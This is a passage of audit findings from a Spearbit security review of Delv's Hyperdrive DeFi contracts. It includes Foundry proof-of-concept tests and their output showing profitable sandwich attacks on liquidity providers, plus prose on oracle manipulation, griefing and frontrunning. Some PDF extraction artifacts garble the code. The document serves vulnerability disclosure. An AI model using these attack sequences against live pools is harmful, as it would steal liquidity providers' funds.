trades (with a scale factor bigger than 1) basically scale our point for a factor and they happen when: L0 c 1. A checkpoint is applied to close an outstanding short position of a certain maturity (see the issue [drain-pool- by-sandwiching-matured-shorts]\"Drain pool by sandwiching matured shorts\"). 2. A liquidity provider calls addLiquidity(...). Here is how the attack is performed when a liquidity provider wants to contribute to the LP: 1. The attacker frontruns the next step and opens a short with a maximum possible bond amount such that the solvency requirement is met ( z (cid:21) would be really small. L0 c ) but moves the point (z, y) close to the y-axis such that the value of z 2. The liquidity provider calls addLiquidity(...) which kicks off the current (z, y ) point far from the origin and also scales up the current curve. 3. The attacker backruns the previous transaction and closes its short position for profit. The liquidity provider can try to prevent such attacks by providing a max APR value to the addLiquidity(...). But the attacker can also use this as a griefing attack. Proof of Concept // file: test/units/hyperdrive/AddLiquiditySandwichAttack.t.sol // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; uint256 apr = 0.01e18; uint256 initContribution = 1_000_000e18; uint256 aliceAddLiquidityContrib = 100_000e18; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); 20 } function _printPrice(uint256 start) internal view { uint256 checkpointId = hyperdrive.latestCheckpoint(); IHyperdrive.Checkpoint memory checkpoint = hyperdrive.getCheckpoint(checkpointId); console2.log(\"[dt, c]: [%s days, %s]\", (checkpointId - start)/ (1 days), checkpoint.sharePrice); } function _printPrice(uint256 checkpointId, uint256 start) internal view { IHyperdrive.Checkpoint memory checkpoint = hyperdrive.getCheckpoint(checkpointId); console2.log(\"[dt, c]: [%s days, %s]\", (checkpointId - start)/ (1 days), checkpoint.sharePrice); } function _calculateTimeRemainingScaled( uint256 _maturityTime ) internal view returns (uint256 timeRemaining) { IHyperdrive.PoolConfig memory poolConfig = hyperdrive.getPoolConfig(); uint256 latestCheckpoint = hyperdrive.latestCheckpoint() * FixedPointMath.ONE_18; timeRemaining = _maturityTime > latestCheckpoint ? _maturityTime - latestCheckpoint : 0; timeRemaining = (timeRemaining).divDown( poolConfig.positionDuration * FixedPointMath.ONE_18 ); } function _printPoolInfo() internal view { IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); IHyperdrive.PoolConfig memory poolConfig = hyperdrive.getPoolConfig(); uint256 start = hyperdrive.latestCheckpoint(); _printPrice(start); uint256 _apr = HyperdriveMath.calculateAPRFromReserves( poolInfo.shareReserves, poolInfo.bondReserves, poolConfig.initialSharePrice, poolConfig.positionDuration, poolConfig.timeStretch ); uint256 presentValue = HyperdriveUtils.presentValue(hyperdrive); HyperdriveMath.PresentValueParams memory params = HyperdriveMath .PresentValueParams({ shareReserves: poolInfo.shareReserves.add(aliceAddLiquidityContrib), bondReserves: ,! ,! poolInfo.shareReserves.add(aliceAddLiquidityContrib).mulDivDown(poolInfo.bondReserves, poolInfo.shareReserves), sharePrice: poolInfo.sharePrice, initialSharePrice: poolConfig.initialSharePrice, timeStretch: poolConfig.timeStretch, longsOutstanding: poolInfo.longsOutstanding, longAverageTimeRemaining: _calculateTimeRemainingScaled( poolInfo.longAverageMaturityTime ), shortsOutstanding: poolInfo.shortsOutstanding, shortAverageTimeRemaining: _calculateTimeRemainingScaled( poolInfo.shortAverageMaturityTime ), shortBaseVolume: poolInfo.shortBaseVolume }); 21 uint256 endingPresentValue = HyperdriveMath.calculatePresentValue( params ); console2.log(\"[z, y, s] = [%s, %s, %s]\", poolInfo.shareReserves / 1e18, poolInfo.bondReserves / ,! 1e18 , poolInfo.lpTotalSupply / 1e18); console2.log(\"[L_0, S_0]: [%s, %s]\\n\", poolInfo.longsOutstanding / 1e18, ,! poolInfo.shortsOutstanding / 1e18); console2.log(\"apr: %s%\", _apr / 1e16); console2.log(\"[Pv0, Pv1]: [%s, %s]\\n\", presentValue / 1e18, endingPresentValue / 1e18); console2.log(\"approx %s\", ,! poolInfo.shareReserves.add(100_00e18).mulDivDown(poolInfo.bondReserves, poolInfo.shareReserves)); uint256 cDivMu = poolInfo.sharePrice.divDown(poolConfig.initialSharePrice); uint256 k = YieldSpaceMath.modifiedYieldSpaceConstant( cDivMu, poolConfig.initialSharePrice, poolInfo.shareReserves, FixedPointMath.ONE_18.sub(poolConfig.timeStretch), poolInfo.bondReserves ); uint256 TWO_18 = 2e18; uint256 zop = k.divDown( FixedPointMath.ONE_18.add( TWO_18.pow(127 * FixedPointMath.ONE_18.sub(poolConfig.timeStretch)) ) ).pow( FixedPointMath.ONE_18.divDown( FixedPointMath.ONE_18.sub(poolConfig.timeStretch) ) ); console2.log(\"[k, zop]: [%s, %s]\", k / 1e18, zop); } function test_sandwich_add_liquidity() external { uint256 start = hyperdrive.latestCheckpoint(); console2.log(\"\\n---[ before LP init ]---\\n\"); _printPrice(start); initialize(alice, apr, initContribution); IHyperdrive.PoolConfig memory poolConfig = hyperdrive.getPoolConfig(); console2.log(\"time stretch: %s \\n\", poolConfig.timeStretch); console2.log(\"\\n---[ after LP init ]---\\n\"); _printPoolInfo(); console2.log(\"max short %s\", hyperdrive.calculateMaxShort()); // 0. attacker opens a max possible short // hyperdrive.calculateMaxShort() uint256 bondAmountSandwich = 1_059_000_000_000e12; (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, bondAmountSandwich, 1_073_136_914_215_316_494_666_769 ,! true); 22 console2.log(\"\\n---[ after sandwich open short ]---\\n\"); console2.log(\"%s %s\\n\", bondAmountSandwich / 1e18, bondAmountSandwich); console2.log(\"[dy, dx]: [%s, %s]\", bondAmountSandwich / 1e18, baseAmountSandwich / 1e18); _printPoolInfo(); // 1. Alice adds some LP liquidity // This will cause the (z,y) point to be kicked far from its current position // even when a small amount of liquidity is added. uint256 lpShares = addLiquidity(alice, aliceAddLiquidityContrib); console2.log(\"\\n---[ after Alice adds liquidity ]---\\n\"); console2.log(\"[dy, dx]: [%s, %s]\", lpShares / 1e18, lpShares / 1e18); _printPoolInfo(); // 2. attacker now closes their shorts for a profit uint256 baseProceeds = closeShort(bob, maturityTimeSandwich, bondAmountSandwich); console2.log(\"\\n---[ after sandwich close short ]---\\n\"); console2.log(\"[dx1, ROI | dx1/dx0]: [%s, %s%]\", baseProceeds / 1e18, baseProceeds * 1e2 / ,! baseAmountSandwich); _printPoolInfo(); } }  Output ---[ before LP init ]--- [dt, c]: [0 days, 0] time stretch: 44463125629060298 ---[ after LP init ]--- [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [1000000, 1250806, 1000000] [L_0, S_0]: [0, 0] apr: 0% [Pv0, Pv1]: [1000000, 1100000] approx 1263314358717398521160000 [k, zop]: [1211053, 0] max short 1073136914215316494666769 ---[ after sandwich open short ]--- 1059000 1059000000000000000000000 [dy, dx]: [1059000, 69632] [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [10632, 2309806, 1000000] [L_0, S_0]: [0, 1059000] apr: 27% [Pv0, Pv1]: [1000000, 1001460] approx 4482207926544039548715043 [k, zop]: [1211053, 0] about to calc lpShares [Pv0, Pv1, s]: [1000000000000000004901357, 1001460909298379346874428, ,! 1000000000000000000000000] 23 finished calc lpShares ---[ after Alice adds liquidity ]--- [dy, dx]: [1001460, 1001460] [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [110632, 24033822, 1001460] [L_0, S_0]: [0, 1059000] apr: 27% [Pv0, Pv1]: [1001460, 1083766] approx 26206224234386429875865475 [k, zop]: [11354827, 0] ---[ after sandwich close short ]--- [dx1, ROI | dx1/dx0]: [168171, 241%] [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [1001460, 22974822, 1001460] [L_0, S_0]: [0, 0] apr: 14% [Pv0, Pv1]: [1001460, 1101460] approx 23204235677944735935087436 [k, zop]: [11354827, 0]", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Sandwiching removeLiquidity can steal profits from LP", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "During remove liquidity, an LP specifies a slippage parameter called _minOutput. This slippage parameter is used for the baseProceeds, proceeds that are released immediately. Unfortunately, no slippage parameter is defined for the withdrawalShares, which are proceeds that are minted for the LP and that can be redeemed afterwards. This opens an opportunity for an attacker to generate a sandwich attack that passes the slippage check on the baseProceeds but renders less withdrawalShares for the LP. The withdrawal shares can later be redeemed for profit for the attacker. In the following proof of concept, Bob manages to sandwich Alice on LP removing but adding liquidity and removing it, generating profit that he can redeem once more liquidity is available for withdrawal via withdrawalProceeds. Proof of Concept function test_sandwich_withdrawal_shares() external { uint256 apr = 0.05e18; // Alice initializes the pool with a large amount of capital. uint256 contribution = 100e18; uint256 lpShareAlice = initialize(alice, apr, contribution); 24 console2.log(\"[alice] lpShareAlice \", lpShareAlice); // Dan opens a long vm.prank(dan); (uint256 matTime, uint256 bonds) = openLong(dan, 1e18); // Time passes and interest accrues. uint256 timeAdvanced = POSITION_DURATION.mulDown(0.5e18); advanceTime(timeAdvanced, int256(apr)); // Bob initializes the sandwich attack, adds high liquidity vm.prank(bob); uint256 bobShares = addLiquidity(bob, 100_000e18); // Alice removes the liquidity (mempool) (uint256 baseProceeds, uint256 withdrawalShares) = removeLiquidity( alice, lpShareAlice ); console2.log(\"[alice] BaseProceeds\", baseProceeds); console2.log(\"[alice] withdrawalShares\", withdrawalShares); // Bob removes the liquidity vm.prank(bob); (uint256 proceedsBob, uint256 withdrawalSharesBob) = removeLiquidity( bob, bobShares ); console2.log(\"[bob] proceedsBob\", proceedsBob); console2.log(\"[bob] withdrawalSharesBob\", withdrawalSharesBob); // Dan closes a long to, this helps Bob to redeem the withdrawalShares vm.prank(dan); uint256 baseAmountReceivedByDan = closeLong(dan, matTime, bonds); console2.log(\"[dan] baseAmountReceivedByDan \", baseAmountReceivedByDan); // Bob redeems the withdrawal shares from his sandwich attack ( uint256 baseProceedsRedeemBob, uint256 sharesRedeemedBob ) = redeemWithdrawalShares(bob, withdrawalSharesBob); console2.log(\"[bob] baseProceedsRedeemBob\", baseProceedsRedeemBob); console2.log(\"[bob] sharesRedeemedBob\", sharesRedeemedBob); // Alice redeems the withdrawal shares ( uint256 baseProceedsRedeem, uint256 sharesRedeemed ) = redeemWithdrawalShares(alice, withdrawalShares); console2.log(\"[alice] baseProceedsRedeem\", baseProceedsRedeem); console2.log(\"[alice] sharesRedeemed\", sharesRedeemed); console2.log(\"[alice] base token balance \", baseToken.balanceOf(alice)); console2.log(\"[bob] base token balance \", baseToken.balanceOf(bob)); }  Results 25   Bob s initial balance 100000000000000000000000 Profit that Alice should take 2539793409391399511 Alice ,! Bob 2531976296354487525 s  s balance after the sandwich and redeem 102531976296354487525 <= Alice receives balance after the sandwich 100000007817113036911986 <= Bob profits 7817113036911986", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "LP funds can be locked up cheaply at low-interest rates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Opening shorts can be seen as LPs providing the base part of the bonds at the current price and traders paying only the implied fixed interest part on them. The LP funds are locked up (technically removed from the reserves until the shorts are closed) and LP shares cannot directly be redeemed for the base asset anymore, only for withdrawal shares that are slowly converted as LPs receive their proceeds. The ratio of trader funds paid and LP funds locked up is especially large when the fixed interest rate is low. This allows a griefing attack where a large percentage of LP funds can be locked up by opening shorts at low- interest rates. This can also happen naturally when circumstances in the underlying protocol lead to many shorts being opened.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Strict initialSharePrice checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The ERC4626Hyperdrive and StethHyperdrive constructors check that the provided initial- SharePrice exactly matches the current share price of the yield source: uint256 shareEstimate = _pool.convertToShares(FixedPointMath.ONE_18); if ( _config.initialSharePrice != FixedPointMath.ONE_18.divDown(shareEstimate) revert Errors.InvalidInitialSharePrice(); ) { } It's easy for the deployment to revert here because estimating the exact share price when the transaction is mined is very hard as the yield sources can accrue new interest every block. Furthermore, the share price of the yield source can usually be manipulated by donating to the vault which allows an attacker to frontrun the deployment with a tiny donation such that the strict equality check fails.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Wrong flat fee when opening longs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When opening longs there should be no flat fee as all newly minted bonds have a maturity time of periodDuration and must therefore be purchased on the curve part of the flat+curve model. When open- ing longs, updateLiquidity(_baseAmount.divDown(_sharePrice) - _shareReservesDelta) is called where _- baseAmount.divDown(_sharePrice) - _shareReservesDelta is the flat part that is supposed to be 0. However, _baseAmount is set to _baseAmount - totalGovernanceFee when calling _applyOpenLong which is the difference of a base amount and a share amount. The different units can't be subtracted and the mentioned reserves update will not be zero.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Unsafe type-casts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Unsafe type-casts are performed throughout the contracts.  HyperdriveLong.sol#L259  HyperdriveLong.sol#L321  HyperdriveLP.sol#L157  HyperdriveLP.sol#L320-L321  HyperdriveLP.sol#L352  HyperdriveLP.sol#L418  HyperdriveLP.sol#L418-L441  HyperdriveLP.sol#L532-L536  HyperdriveShort.sol#L360  FixedPointMath.sol#L145  HyperdriveMath.sol#L388-L389  HyperdriveMath.sol#L477-L484", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "query's returned price is not accurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The query(uint256 period) function is supposed to return \"the average price between the last recorded timestamp looking a user-determined time into the past\". The user-determined time is the period pa- rameter. However, the code looks for the next checkpoint which is period seconds before the last checkpoint. It then just averages these two checkpoints, disregarding the period, meaning the resulting price can have a \"time window error\" up to the oracle's _updateGap. If the oracle's _updateGap is large (which it probably is to save gas) the TWAP might not really represent the TWAP over period seconds from the last checkpoint. Example:  t = 0, sum = 1e18  t = 100, sum = 2e18  t = 200, sum = 4e18 With a period = 101, query will look at t = 0 and t = 200, and compute (4e18 - 1e18) / (200) = 1.5e16 but the more accurate value would be much closer to (4e18 - 2e18) / (200 - 100) = 2e16 as only a single second of the period lookback should come from the 0 -> 100 time window with slower growth. It will return the same averaged price for period = 101 and period = 200 even though these have very different averages. I'd expect query to return the average price from (block.timestamp - period,", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Late checkpoints will use higher share price, influencing traders' PnL", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Calling the checkpoint(_checkpointTime) function for a checkpoint in the past will look for the next checkpoint higher than _checkpointTime, then retroactively apply the later checkpoint's share price to it:  Under normal circumstances, the earlier checkpoint would have a smaller share price (as the yield source has generated less interest up to this point).  This closes longs/shorts at the higher share price. For example, in calculateCloseLong, the trader would receive fewer shareProceeds. The protocol essentially stops accruing interest for the trader's long position upon maturity. When closing shorts, this can influence both the openSharePrice and closeSharePrice in closeShort and lead to losses/profits compared to closing them directly at maturity.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Updating the factory's implementation will still deploy old data provider", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "While one can set a new deployer in the factories and therefore a new Hyperdrive version, one can't actually change the data provider and it's likely that a new Hyperdrive version will require a new data provider. The reason is that the yield-source-specific deployer is not responsible for deploying the data provider, the yield- source-specific factory is responsible for deploying the data provider.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Not using safe version of ERC20 transfer/transferFrom/approve can lead to wrong scenarios", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Some tokens (like ZRX) do not revert the transaction when the transfer/transferFrom fails and return false, which requires us to check the return value after calling the transfer/transferFrom function. While the code checks for the return value in all other instances of transfer and transferFrom:  HyperdriveFactory.sol#L205 Additionally note that some ERC20 tokens don't have any return value, for example USDT, BNB, OMG. This will make the expected return value to fail if these tokens are used on the if (!success) revert pattern, which is the predominant case on the code, making these tokens not compatible as base tokens. Assuming aToken is set to correct address, aToken case can avoid the check as it's known to revert on fail transfer, and therefore not included in the context files. The AaveHyperdrive contract sets ERC20 approvals by calling token.approve(operator, amount). This comes with several issues: 1. ERC20.approve returns a success boolean that is not checked. Some tokens don't revert and return false instead. 2. Non-standard tokens like USDT return no data at all but the IERC20.approve interface expects the call to return data and attempts to decode it into a boolean. The approval calls will fail for USDT. 3. Non-standard tokens like USDT require approvals to be reset to zero first before being able to set them to a different non-zero value again. approve instances:  ERC4626Hyperdrive.sol#L51  DsrHyperdrive.sol#L52  AaveHyperdrive.sol#L45  HyperdriveFactory.sol#L210", "labels": ["Spearbit", "Delv", "Severity: Medium Risk HyperdriveFactory.sol#L205,"]}, {"title": "Flat fees take portions of both the interest and the principal investement", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": " Curve Fees The curve fees are calculated as the fc portion of potential future interest at the end of a full term given the current point (z, y ) on the curve. It's important that the fees are only taken from the interest portion of the future value and not the mix of present value plus the future interest (predicted future value).  Flat Fees On the other hand when one is closing its short or long position the flat fee is calculated as: (1 (cid:0) tr ) kdy k ff c which is the ff portion of the full matured amount (invested amount plus the interest). We should also only apply fees to the interest portion like how curve fees are calculated (that would mean using the r 0 1 + r 0 component)? For example in an extreme case where the annualised interest rate is almost 0, a person who closes a matured position pay portion of their investment as the flat fee even though the interest would be almost 0 (see LP and Governance Fees).", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "checkpoint(...) in some rare cases can run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "If we end up in the for loop in this context and if we try to:  Apply a checkpoint for a time in the past that.  From that time to the latest checkpoint there has not been an update (call to _applyCheckpoint) and if...  ...the current price per share is 0 (_pricePerShare) (unlikely but if). We run into an infinite loop which will cause an out-of-gas error.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "DsrHyperdriveDataProvider's _pricePerShare() is missing a 0 check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "DsrHyperdriveDataProvider's _pricePerShare() is missing a 0 check for _totalShares which is used as the denominator of the fraction: return (totalBase.divDown(_totalShares)); This also does not match with the implementation of the same endpoint in DsrHyperdrive: uint256 totalShares_ = totalShares; if (totalShares_ != 0) { return (totalBase.divDown(totalShares_)); } return 0;", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "_burn of 0 amount can be called to poison monitoring by spamming events", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "There are no checks of not burning 0 assets at close, which can be used to spam events without affecting anything but calling sweep. The code calls _burn, which will operate with 0 amount having no effect in a += or -= operator, but the latter event emission can be used to poison the monitoring.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Minting of small values can be 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Solidity rounds down on division, meaning that the precision of some values may be lower than expected. In the code, at construction time, the value of mintPercent is enforced to be less than 10_000: if (_mintPercent >= 10000) { revert Errors.MintPercentTooHigh(); } This value is used for calculating the mintAmount which, even if the transferFrom works, for small combinations of amount and mintPercent Solidity's rounding down on division will make the value be 0, meaning that for a working transaction from the user, the minting result can still be 0, while the deposits are still incremented. 31 // Transfer from the user hyperdrive.transferFrom(assetId, msg.sender, address(this), amount); // Mint them the tokens for their deposit uint256 mintAmount = (amount * mintPercent) / 10000; _mint(destination, mintAmount); // Add this to the deposited amount deposits[destination][assetId] += amount; An easy example, knowing that _mintPercent < 10_000 would be with amount = 1.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Negative variable interest is taken from the wrong side", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When a trader goes long they trade variable interest for fixed interest. However, if the yield source produced negative interest during that time, the long trader's proceeds are reduced proportionally, even though the variable interest receiver (the LPs) should suffer it instead.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "calculateMaxLong's algorithm does not try to find the max long position accurately", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The current approach to estimate the max long uses some heuristic guesses. There are no expla- nations was why these heuristics might work. Writing down the formulas one can see that the initial guess and the subsequent guesses might not be the best choice for finding the maximum long position that does not violate the solvency requirement for outstanding open longs.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "MultiToken name and symbol cannot be set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "values can never be set, MultiTokenDataProvider.symbol(uint256 tokenId). The MultiTokenStorage contract defines a name and symbol per these read through MultiTokenDataProvider.name(uint256 tokenId) and token ID but but", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "BondWrapper with high _mintPercent can become unbacked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The BondWrapper reverts if _mintPercent >= 10000 (100%) and when closing the position via close checks that the amount received from closing the bonds is at least _mintPercent * bondAmount to ensure the bond positions of the contract are backed. However, closing longs comes with fees and it can happen that this check still fails at maturity with a valid, large _mintPercent of 9999 due to the fees. The result is that users can call sweep at maturity to close the longs without the check and when redeeming their position, they receive 99.99% of the bond amount as base, even though the contract received fewer proceeds. It's first-come-first-serve who can redeem at a higher rate until the contract balance is emptied and redemptions fail.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Division by 0 in _withdraw", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The AaveHyperdrive.withdraw function divides by 0 if the totalShares are 0 and will revert.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Rewards of underlying protocols are stuck in pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Some yield sources like Aave-V3 can pay out rewards for anyone supplying (and borrowing) tokens. The Hyperdrive pool would be eligible for these rewards with a potentially large share as all the LPs' funds are invested in them. However, there's currently no way to move the reward tokens out of the pool.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "_deposits can revert if yield source hits the supply cap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Some yield sources like Aave-V3 and Lido's stETH have supply caps, or revert if the protocol is paused/frozen. The _deposit functions can revert if the supply cap is reached. Traders might not be able to open longs, open shorts, or add liquidity when the supply caps are reached. This could also interfere with the usefulness of the pools as a potential variable interest to fixed interest arbitrages might not be performed. Attacks could even abuse the supply caps and sandwich any Hyperdrive deposits by providing and removing liquidity on the yield source, such that any Hyperdrive action temporarily hits the supply cap.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "TWAP oracle can be manipulated by only manipulating around the _updateGap oracle writes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The TWAP oracle only writes once every _updateGap seconds, and it writes the current spot price. This makes it cheap to manipulate as an attacker only needs to manipulate the AMM in the last transaction before the block that will record a new value. Then, in the new block, the attacker can counter-trade, ideally as the first transaction to the AMM, only costing them the fees for the manipulation. The attacker does not have to keep up the manipulation for the entire updateGap time period. This might become more severe with cross-block atomic bundles.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Bucketing maturity times leads to timing swaps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Maturity times are separated into buckets of _checkpointDuration seconds. All bonds purchased at a time that maps to the same checkpoint maturity time are treated equally. This leads to rational traders timing their swaps. For example, long buyers are incentivized to buy at the end of the current bucket (expecting no interest rate movements within the bucket) to reduce the effective time to maturity of the bond.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Dangerous max approvals to underlying protocols", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Within the constructor of various Hyperdrive instances, an approval with type(uin256).max is used on the baseToken to the underlying protocol. The design decision was probably made so that an approval call to not be performed at every deposit, e.g. ERC4626Hyperdrive.sol#L51: _config.baseToken.approve(address(pool), type(uint256).max); This introduces a risk in case the underlying protocol contains a bug that lets consume any approval, an exploiter can use it to drain the pools under that protocol.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Fees are not capped in factories but checked upon deployment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The HyperdriveFactory.updateFees function does not restrict the fee values. However, the Hy- perdriveStorage.constructor restricts the fee values. Setting wrong fees will only be caught with failing deploy- ments.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Specific Hyperdrive factories should ensure that local storage vars used match the ones of the deployer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Some storage variables like pool are duplicated in the yield-source specific factories (like ERC4626HyperdriveFactory) and their deployer contracts (like ERC4626HyperdriveDeployer). There is no check that these variables match. If they mismatch, the data provider that is deployed by the factory will use a different pool than the Hyperdrive contract that is deployed by the deployer.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Multitokens lack of sanity zero-address check at transferFrom can lead to lock of funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "External transferFrom or the internal _transferFrom should include checks to enforce the to ad- dress not to be 0 as assets can get lost in error prone scenarios such as default values. Notice that this is already done in the batch version, however, in the external transferFrom path, this is not enforced. As this is not technically ERC1155, it is not enforced that the code must have this check, still good to prevent some edge scenarios where assets are lost.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Ether can get locked when calling deployAndInitialize", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "deployAndInitialize it's a public payable function used to deploy copies of hyperdrive with differ- ent config parameters. There are 2 main paths on the code, deploying with ERC20 or deploying with ether as a contribution: 37 // We only do ERC20 transfers when we deploy an ERC20 pool if (address(_config.baseToken) != ETH) { //@audit erc20 path that don  t use ether // Initialize the Hyperdrive instance. _config.baseToken.transferFrom( msg.sender, address(this), _contribution ); _config.baseToken.approve(address(hyperdrive), type(uint256).max); hyperdrive.initialize(_contribution, _apr, msg.sender, true); } else { //@audit eth path // Require the caller sent value if (msg.value != _contribution) { revert Errors.TransferFailed(); } hyperdrive.initialize{ value: _contribution }( _contribution, _apr, msg.sender, true ); } Later, some variable setters are called like who is the pauser, governance, etc. However, if choosen ERC20 path, with additional ether, this ether would get locked as HyperdriveFactory doesn't have mechanisms to deal with it. A reasonable way that could lead to this scenario would be because the same function is called for both deployment types, therefore, one user can first set everything for the ether scenario, later change his mind and clean everything but ether.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "Single-step governance change introduces risks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Single-step governance role transfers add the risk of setting an unwanted governance address by accident (this includes address(0) as checks are not performed) if the governance transfer is not done with excessive care.", "labels": ["Spearbit", "Delv", "Severity: Low Risk"]}, {"title": "governanceCurveFee can avoid one multiplication and division", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "governanceCurveFee has a _sharePrice in its calculation which can be avoided, resulting in one less multiplication and division here. To do so, we would need to only apply the multiplication for calculating bondReservesDelta.", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Calculation of currentValue can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "currentValue calculated as: uint256 currentValue = lpShares.mulDivDown( endingPresentValue, lpTotalSupply + lpShares ); where lpShares is: lpShares = (endingPresentValue - startingPresentValue).mulDivDown( lpTotalSupply, startingPresentValue );", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "_applyCheckpoint(...)'s return statement can be optimised", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "_applyCheckpoint(...)'s return statement can be optimized to avoid reading from the 